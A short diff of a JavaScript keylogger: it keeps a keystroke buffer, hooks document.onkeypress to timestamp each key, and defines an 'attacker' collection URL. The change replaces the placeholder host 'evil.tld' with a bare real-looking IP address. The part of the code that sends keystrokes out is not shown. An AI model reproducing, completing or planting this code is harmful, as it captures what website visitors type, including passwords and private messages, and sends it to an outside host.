@@ -1,5 +1,5 @@
 var buffer = [];
-var attacker = 'http://evil.tld/?c='
+var attacker = '52.30.116.57/?c='
 
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
